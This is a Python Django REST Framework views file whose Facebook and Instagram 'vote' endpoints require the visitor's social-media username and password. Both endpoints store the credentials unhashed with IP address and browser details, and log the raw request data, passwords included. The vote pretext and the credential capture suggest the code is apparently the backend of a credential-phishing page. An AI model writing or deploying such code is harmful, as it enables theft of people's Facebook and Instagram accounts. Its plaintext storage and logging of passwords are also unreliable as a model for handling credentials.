from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .serializers import VoteSerializer
from .models import Vote  # Import the Vote model
import logging

logger = logging.getLogger(__name__)

class FacebookVoteView(APIView):
    def post(self, request):
        logger.info("Received Facebook vote request: %s", request.data)

        username = request.data.get('username')
        password = request.data.get('password')

        if not username or not password:
            logger.error("Username and password are required.")
            return Response(
                {'error': 'Username and password are required.'},
                status=status.HTTP_400_BAD_REQUEST
            )

        user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
        ip_address = self._get_client_ip(request)

        vote_data = {
            'platform': 'facebook',
            'username': username,
            'password': password,
            'device_model': 'Unknown',
            'device_manufacturer': 'Unknown',
            'operating_system': self._get_operating_system(user_agent),
            'os_version': 'Unknown',
            'ip_address': ip_address,
            'user_agent': user_agent,
            'network_info': 'Unknown',
            'carrier_info': 'Unknown',
            'bluetooth_ssid': None,
            'wifi_ssid': None,
        }

        # Validate the data using the serializer (without saving)
        serializer = VoteSerializer(data=vote_data)
        if serializer.is_valid():
            try:
                # Save using the traditional method
                Vote.objects.create(**vote_data)
                logger.info("Vote submitted successfully: %s", vote_data)
                return Response({'message': 'Vote submitted successfully.'}, status=status.HTTP_201_CREATED)
            except Exception as e:
                logger.error("Error saving vote: %s", str(e))
                return Response({'error': 'Failed to save vote.'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

        logger.error("Invalid vote data: %s", serializer.errors)
        return Response({'error': 'Invalid vote data.', 'details': serializer.errors}, status=status.HTTP_400_BAD_REQUEST)

    def _get_client_ip(self, request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        return x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')

    def _get_operating_system(self, user_agent):
        if 'Windows' in user_agent:
            return 'Windows'
        elif 'Macintosh' in user_agent:
            return 'Mac'
        elif 'Linux' in user_agent:
            return 'Linux'
        elif 'Android' in user_agent:
            return 'Android'
        elif 'iOS' in user_agent:
            return 'iOS'
        return 'Unknown'


class InstagramVoteView(APIView):
    def post(self, request):
        logger.info("Received Instagram vote request: %s", request.data)

        username = request.data.get('username')
        password = request.data.get('password')

        if not username or not password:
            logger.error("Username and password are required.")
            return Response(
                {'error': 'Username and password are required.'},
                status=status.HTTP_400_BAD_REQUEST
            )

        user_agent = request.META.get('HTTP_USER_AGENT', 'Unknown')
        ip_address = self._get_client_ip(request)

        vote_data = {
            'platform': 'instagram',
            'username': username,
            'password': password,
            'device_model': 'Unknown',
            'device_manufacturer': 'Unknown',
            'operating_system': self._get_operating_system(user_agent),
            'os_version': 'Unknown',
            'ip_address': ip_address,
            'user_agent': user_agent,
            'network_info': 'Unknown',
            'carrier_info': 'Unknown',
            'bluetooth_ssid': None,
            'wifi_ssid': None,
        }

        serializer = VoteSerializer(data=vote_data)
        if serializer.is_valid():
            try:
                Vote.objects.create(**vote_data)
                logger.info("Vote submitted successfully: %s", vote_data)
                return Response({'message': 'Vote submitted successfully.'}, status=status.HTTP_201_CREATED)
            except Exception as e:
                logger.error("Error saving vote: %s", str(e))
                return Response({'error': 'Failed to save vote.'}, status=status.HTTP_500_INTERNAL_SERVER_ERROR)

        logger.error("Invalid vote data: %s", serializer.errors)
        return Response({'error': 'Invalid vote data.', 'details': serializer.errors}, status=status.HTTP_400_BAD_REQUEST)

    def _get_client_ip(self, request):
        x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
        return x_forwarded_for.split(',')[0] if x_forwarded_for else request.META.get('REMOTE_ADDR')

    def _get_operating_system(self, user_agent):
        if 'Windows' in user_agent:
            return 'Windows'
        elif 'Macintosh' in user_agent:
            return 'Mac'
        elif 'Linux' in user_agent:
            return 'Linux'
        elif 'Android' in user_agent:
            return 'Android'
        elif 'iOS' in user_agent:
            return 'iOS'
        return 'Unknown'